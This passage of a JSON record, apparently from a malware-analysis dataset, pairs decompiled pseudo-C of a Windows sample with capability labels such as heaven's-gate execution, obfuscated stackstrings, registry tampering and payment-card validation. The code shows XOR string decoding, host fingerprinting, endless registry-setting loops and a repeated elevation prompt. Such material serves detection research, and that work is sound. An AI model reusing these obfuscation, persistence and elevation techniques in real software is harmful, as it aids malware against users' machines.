        "decompiled_code": "\nulong __cdecl fcn.00409867(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.00409724(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.00408cbb(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.0040e3c0(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 578
    },
    "004105c0": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004105c0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.00410615(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 184
    },
    "00401000": {
        "rules": [
            "create or open registry key",
            "contain obfuscated stackstrings",
            "contain loop",
            "get hostname",
            "query or enumerate registry value",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401000(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41195c;\n    uStack104 = *0x411958;\n    uStack108 = *0x411954;\n    // [00] -r-x section size 65536 named .text\n    name = *0x411950;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41daac;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x411960;\n    uStack92 = *0x411964;\n    uStack88 = *0x411968;\n    uStack84 = *0x41196c;\n    var_3ch = *0x411940;\n    uStack60 = *0x411944;\n    uStack56 = *0x411948;\n    uStack52 = *0x41194c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41dab4 = uVar10 ^ uVar8;\n        *0x41dab8 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41daac = uVar8;\n        *0x41dab0 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1712
    },
    "004016aa": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004016aa(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41ddd0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 216
    },
    "00408022": {
        "rules": [
            "create or open registry key",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00408022(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uchar var_58h;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    ushort var_47h;\n    uchar var_45h;\n    uint var_44h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_26h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0x38373801;\n    var_57h = 0x10342533;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_ch = 5;\n    var_58h = 5;\n    var_53h = 0x23343b3f;\n    var_4fh = 0x313d0123;\n    var_4bh = 0x3b251025;\n    var_47h = 0x3539;\n    var_45h = 0x23;\n    stack0xffffffb9 = 0x39120b21;\n    var_3fh = 0x3f322000;\n    var_3bh = 0x25372438;\n    var_37h = 0x3c1d2522;\n    var_33h._0_2_ = 0x180b;\n    var_33h._2_1_ = 0x22;\n    var_64h = 6;\n    var_33h._3_1_ = 6;\n    var_2fh = 0x293f2537;\n    stack0xffffffd2 = 0x38340472;\n    stack0xffffffd7 = 0x3f36393b;\n    var_21h = 0x3f38082e;\n    var_1dh = 0x720e0129;\n    var_19h._0_2_ = 0x1035;\n    var_19h._2_1_ = 0x72;\n    var_8h = 0x4c515752;\n    var_4h._0_1_ = 0x72;\n    var_44h._0_1_ = var_58h;\n    var_2bh._0_1_ = var_33h._3_1_;\n    var_26h._0_1_ = var_33h._3_1_;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != 0xe259ba) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_8h = 0x67010360;\n    var_4h._0_1_ = 0x37;\n    var_14h = 0x57313652;\n    var_10h._0_2_ = 0x4937;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = &var_8h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        iVar2 = var_68h;\n        if (iVar3 != 0x67de0f) {\n            *(iVar5 + iVar4) = *(&var_14h + iVar5 % var_64h) ^ (iVar5 + iVar4)[&var_8h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1323
    },
    "0040a428": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a428(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_14h = *0x413430;\n    var_48h = 0x715d522a;\n    var_44h = 0x520d522a;\n    var_40h = 0x522d7145;\n    var_3ch = 0x7157520b;\n    var_38h = 0x52345210;\n    var_34h = 0x522f715b;\n    var_30h = 0x715d520b;\n    var_2ch = 0x5216523f;\n    var_28h = 0x52387154;\n    var_24h._0_2_ = 0x5279;\n    var_20h = 0x71325279;\n    var_1ch._0_2_ = 0x524c;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_18h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x47e921) {\n            var_ch = 6;\n            *(iVar5 + iVar2) = *(&var_20h + iVar5 % 6) ^ (iVar5 + iVar2)[&var_48h - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar2, 0, 0xf003f, &var_4h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        var_40h = 0x6126361a;\n        var_3ch = 0x525a5913;\n        var_38h = 0x3636612d;\n        var_34h = 0x592c6135;\n        var_30h = 0x61195257;\n        var_2ch = 0x613b360a;\n        var_28h = 0x5253591b;\n        var_24h._0_2_ = 0x6161;\n        var_ch = 0x61523659;\n        var_8h._0_1_ = 0x61;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        hKey = &var_40h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar3 != 0xea9656) {\n                hKey = 5;\n                *(iVar5 + iVar2) = *(&var_ch + iVar5 % 5) ^ (iVar5 + iVar2)[&var_40h - iVar2];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, iVar2, 0, 4, &var_14h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        iVar2 = var_18h;\n    }\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 1069
    },
    "00401706": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401706(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_3ah;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uchar var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_64h = 0xf01faf00;\n    var_60h = 0x505600;\n    var_5ch = 0x8002700;\n    var_58h = 0xc2900;\n    var_54h = 0x56900;\n    var_50h = 0x3ff00;\n    var_4ch = 0x1c4200;\n    var_48h = 0x163e00;\n    var_14h = 0;\n    var_2ch = 0x1191d30;\n    var_28h = 0x294c6533;\n    var_24h = var_24h & 0xff000000 | 0x673f36;\n    var_1ch = 0x535a4d62;\n    var_18h._0_2_ = 0x5167;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_ch = &var_2ch - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar6 != 0x5446c5) {\n            var_8h = 6;\n            *(iVar11 + iVar5) = *(&var_1ch + iVar11 % 6) ^ (iVar11 + iVar5)[var_ch];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_34h = 0x3d0a1467;\n    var_30h = 0x2044000;\n    var_2ch = 0x461262d;\n    var_28h = 0x5c262c12;\n    var_24h = 0x2f380a15;\n    var_20h = 0x32;\n    var_8h = 0x59636132;\n    var_4h._0_1_ = 0x43;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_ch = &var_34h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0xe28458) {\n            var_ch = 5;\n            *(iVar11 + iVar5) = *(&var_8h + iVar11 % 5) ^ (iVar11 + iVar5)[&var_34h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_14h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_44h);\n        uVar3 = var_3ah;\n        uVar2 = var_3ah & 0xffffff;\n        var_3ah = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_64h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1267
    },
    "00403de1": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403de1(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    uint var_7ch;\n    uint hObject;\n    int32_t var_5ch;\n    int32_t lpLibFileName;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpszLongPath;\n    uint var_8h;\n    uint var_4h;\n    \n    lpszLongPath = *0x41da98;\n    var_40h = 0x66106170;\n    puVar8 = &lpDst;\n    for (iVar6 = 0x410; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x613b6439;\n    var_38h = 0x64396603;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x66426127;\n    var_30h = 0x6126640c;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_2ch = 0x6423661e;\n    var_28h = 0x66026121;\n    puVar8 = &lpszShortPath;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_24h = 0x6166643d;\n    var_20h = 0x640c6655;\n    var_1ch = 0x660a6136;\n    var_18h = 0x617b6434;\n    var_14h = 0x64286602;\n    var_10h = 0x66676130;\n    var_8h = 0x66676155;\n    var_4h._0_2_ = 0x6450;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_50h = 6;\n    iVar7 = 0;\n    var_54h = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0xb0b352) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_40h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_2ch = 0x301a7141;\n    var_28h = 0x3551610e;\n    var_24h = 0x71126d12;\n    var_20h = 0x610c3041;\n    var_1ch = 0x6d443503;\n    var_18h = 0x30107141;\n    var_14h = 0x3553611e;\n    var_10h = CONCAT22(var_10h._2_2_, 0x6d30);\n    var_48h = 0x30357161;\n    var_44h._0_1_ = 0x6d;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4ch = 5;\n    iVar7 = 0;\n    var_5ch = iVar6;\n    lpszLongPath = &var_2ch - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar3 != 0x40e80) {\n            *(iVar7 + iVar6) = *(&var_48h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar6, &lpszShortPath);\n    var_18h = 0x79264b33;\n    var_14h = 0x4b204d2f;\n    var_10h = 0x4d417920;\n    var_8h = 0x79534b41;\n    puVar8 = &var_98h;\n    for (iVar6 = 0x3c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4h._0_2_ = 0x4d41;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_8ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_48h = var_8ch;\n    lpszLongPath = &var_18h - var_8ch;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar7 != 0xfebc0a) {\n            *(iVar6 + var_8ch) = *(&var_8h + iVar6 % var_50h) ^ (iVar6 + var_8ch)[&var_18h - var_8ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_88h = &lpDst;\n    var_98h = 0x3c;\n    var_84h = &ARG_0;\n    var_7ch = 3;\n    var_94h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_18h = 0x1611093e;\n    var_14h = 0x7a735e38;\n    var_10h = 0x4101183e;\n    var_8h = 0x5a54416d;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x74);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    lpszLongPath = &var_18h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar3 != 0x707487) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_1ch = 0x6073e63;\n    var_18h = 0x33482934;\n    var_14h = 0x92c1f01;\n    var_10h = 0x6a352e75;\n    var_8h = 0x6a625630;\n    var_4h._0_2_ = 0x6c58;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpszLongPath = &var_1ch - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xef0184) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_90h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar7 = (*pcVar5)(&var_98h);\n        if (iVar7 != 0) break;\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_48h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_5ch);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_54h);\n    (*pcVar5)(uVar2);\n    return 1;\n}\n",
        "token_count": 2628
    },
    "00404364": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
